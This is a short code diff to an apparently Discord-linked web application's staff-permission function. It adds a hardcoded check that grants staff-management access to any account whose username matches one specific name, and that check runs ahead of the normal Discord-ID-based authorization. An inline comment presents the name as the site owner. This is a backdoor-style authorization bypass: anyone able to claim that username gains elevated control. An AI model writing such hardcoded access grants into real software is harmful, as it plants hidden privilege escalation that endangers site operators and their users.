@@ -368,6 +368,10 @@ async def _staff_manager(request):
 
 
 def _can_manage_staff(user, guild):
+    # The designated website owner account has staff-management access by default.
+    if str(user.get("username", "")).casefold() == "glitchstorm7320":
+        return True
+
     discord_id = str(user.get("discordId") or "").strip()
     if not discord_id.isdigit():
         return False
